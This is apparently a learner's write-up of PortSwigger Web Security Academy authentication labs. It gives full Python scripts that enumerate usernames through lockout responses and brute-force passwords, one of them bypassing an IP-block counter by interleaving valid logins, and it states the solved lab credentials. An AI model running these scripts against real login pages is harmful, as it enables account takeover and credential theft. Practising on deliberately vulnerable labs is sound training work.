
# Lab: Username enumeration via different responses

This lab is vulnerable to username enumeration and password brute-force attacks. It has an account with a predictable username and password, which can be found in the following wordlists:

- [Candidate usernames](https://portswigger.net/web-security/authentication/auth-lab-usernames)
- [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)

To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.

## solution :

when we open website , we have a login endpoint , meanwhile we have the list of the username and password , so we capture the request of the login and then send to the intruder and then paste the list of the usename and place a $ in the username and start attack and we will find the username and place $ in the password and we will find the password and the login with the username and password which we found , the lab solves


-----

# Lab: Broken brute-force protection, IP block

Solution :

for this , when we open the page , there is My-account page , the default creds is wiener:peter but we need to log via the username carlos , for that they have provided the list of the password , but it has the security check that ip we give the wrong pass of the username carlos three times it will block the ip , so thhe flaw is we can give the try pass two time and then we need to give the crt username and password that is `wiener` and peter one time like that we need to give

so , i craft the payload 
```
import requests

TARGET = "https://0ad400bf03e7dff4813439c400230079.web-security-academy.net/login"

VALID_USER = "wiener"
VALID_PASS = "peter"
TARGET_USER = "carlos"

passwords = [
    "123456","password","12345678","qwerty","123456789","12345","1234","111111",
    "1234567","dragon","123123","baseball","abc123","football","monkey","letmein",
    "shadow","master","666666","qwertyuiop","123321","mustang","1234567890","michael",
    "654321","superman","1qaz2wsx","7777777","121212","000000","qazwsx","123qwe",
    "killer","trustno1","jordan","jennifer","zxcvbnm","asdfgh","hunter","buster",
    "soccer","harley","batman","andrew","tigger","sunshine","iloveyou","2000",
    "charlie","robert","thomas","hockey","ranger","daniel","starwars","klaster",
    "112233","george","computer","michelle","jessica","pepper","1111","zxcvbn",
    "555555","11111111","131313","freedom","777777","pass","maggie","159753",
    "aaaaaa","ginger","princess","joshua","cheese","amanda","summer","love",
    "ashley","nicole","chelsea","biteme","matthew","access","yankees","987654321",
    "dallas","austin","thunder","taylor","matrix","mobilemail","mom","monitor",
    "monitoring","montana","moon","moscow"
]

session = requests.Session()

def login(username, password):
    return session.post(
        TARGET,
        data={"username": username, "password": password},
        allow_redirects=False  # So we can check the raw 302
    )

print("[*] Starting brute-force with IP-reset bypass...\n")

for i, pwd in enumerate(passwords):
    # Reset counter every 2 carlos attempts
    if i % 2 == 0:
        r = login(VALID_USER, VALID_PASS)
        status = "OK" if r.status_code == 302 else "FAIL"
        print(f"[~] Reset with wiener:peter -> {status}")

    r = login(TARGET_USER, pwd)

    if r.status_code == 302:
        print(f"\n[+] SUCCESS! carlos's password is: {pwd}")
        break
    elif r.status_code == 200:
        print(f"[-] {pwd} -> wrong")
    else:
        print(f"[!] Unexpected status {r.status_code} on '{pwd}', retrying reset...")
        login(VALID_USER, VALID_PASS)
```

the carlos:montana

------

# Lab: Username enumeration via account lock

Solution :

at first , the default creds is not given , so we need the script , if the length of the username is changes we have found and after find the username , we need to another script for the password with the 302 , 

`username`
```
import requests

TARGET = "https://0a1700ca04b1269a8b0ebd9100cf008b.web-security-academy.net/login"
PASSWORD = "peter"

usernames = [
    "carlos","root","admin","test","guest","info","adm","mysql","user","administrator",
    "oracle","ftp","pi","puppet","ansible","ec2-user","vagrant","azureuser","academico",
    "acceso","access","accounting","accounts","acid","activestat","ad","adam","adkit",
    "admin","administracion","administrador","administrator","administrators","admins",
    "ads","adserver","adsl","ae","af","affiliate","affiliates","afiliados","ag","agenda",
    "agent","ai","aix","ajax","ak","akamai","al","alabama","alaska","albuquerque","alerts",
    "alpha","alterwind","am","amarillo","americas","an","anaheim","analyzer","announce",
    "announcements","antivirus","ao","ap","apache","apollo","app","app01","app1","apple",
    "application","applications","apps","appserver","aq","ar","archie","arcsight",
    "argentina","arizona","arkansas","arlington","as","as400","asia","asterix","at",
    "athena","atlanta","atlas","att","au","auction","austin","auth","auto","autodiscover"
]

# Send 5 requests per username to trigger lockout on valid ones
ATTEMPTS = 5

print(f"[*] Enumerating {len(usernames)} usernames ({ATTEMPTS} attempts each)...\n")
print(f"{'USERNAME':<20} {'STATUS':>7}  {'LENGTH':>7}  NOTE")
print("-" * 55)

findings = []

for username in usernames:
    responses = []
    for _ in range(ATTEMPTS):
        r = requests.post(
            TARGET,
            data={"username": username, "password": PASSWORD},
            allow_redirects=False
        )
        responses.append(r)

    last = responses[-1]
    length = len(last.text)
    status = last.status_code

    # Key detection: account lockout message = valid username
    if "You have made too many incorrect login attempts" in last.text:
        note = "*** LOCKED OUT — VALID USERNAME ***"
        findings.append(username)
    elif status == 302:
        note = "*** 302 REDIRECT — LOGGED IN ***"
        findings.append(username)
    else:
        note = ""

    print(f"{username:<20} {status:>7}  {length:>7}  {note}")

print("\n" + "=" * 55)
if findings:
    print(f"[+] Valid username(s) found: {findings}")
else:
    print("[-] No valid usernames detected. Try increasing ATTEMPTS.")

```

`password`
```
import requests
import time

TARGET = "https://0a1700ca04b1269a8b0ebd9100cf008b.web-security-academy.net/login"
USERNAME = "accounting"

passwords = [
    "123456","password","12345678","qwerty","123456789","12345","1234","111111",
    "1234567","dragon","123123","baseball","abc123","football","monkey","letmein",
    "shadow","master","666666","qwertyuiop","123321","mustang","1234567890","michael",
    "654321","superman","1qaz2wsx","7777777","121212","000000","qazwsx","123qwe",
    "killer","trustno1","jordan","jennifer","zxcvbnm","asdfgh","hunter","buster",
    "soccer","harley","batman","andrew","tigger","sunshine","iloveyou","2000",
    "charlie","robert","thomas","hockey","ranger","daniel","starwars","klaster",
    "112233","george","computer","michelle","jessica","pepper","1111","zxcvbn",
    "555555","11111111","131313","freedom","777777","pass","maggie","159753",
    "aaaaaa","ginger","princess","joshua","cheese","amanda","summer","love",
    "ashley","nicole","chelsea","biteme","matthew","access","yankees","987654321",
    "dallas","austin","thunder","taylor","matrix","mobilemail","mom","monitor",
    "monitoring","montana","moon","moscow"
]

print(f"[*] Brute-forcing password for username: {USERNAME}\n")
print(f"{'PASSWORD':<20} {'STATUS':>7}  {'LENGTH':>7}  NOTE")
print("-" * 55)

for pwd in passwords:
    # Fresh session each attempt to avoid lockout carrying over
    session = requests.Session()

    r = session.post(
        TARGET,
        data={"username": USERNAME, "password": pwd},
        allow_redirects=False
    )

    status = r.status_code
    length = len(r.text)

    if status == 302:
        print(f"{pwd:<20} {status:>7}  {length:>7}  *** SUCCESS — PASSWORD FOUND ***")
        print(f"\n[+] Credentials: {USERNAME} : {pwd}")
        break
    elif "You have made too many incorrect login attempts" in r.text:
        print(f"{pwd:<20} {status:>7}  {length:>7}  [!] LOCKED — waiting 60s...")
        time.sleep(60)  # Wait for lockout window to reset
        # Retry same password after cooldown
        session = requests.Session()
        r = session.post(TARGET, data={"username": USERNAME, "password": pwd}, allow_redirects=False)
        if r.status_code == 302:
            print(f"\n[+] Credentials: {USERNAME} : {pwd}")
            break
    else:
        print(f"{pwd:<20} {status:>7}  {length:>7}")
```

------------

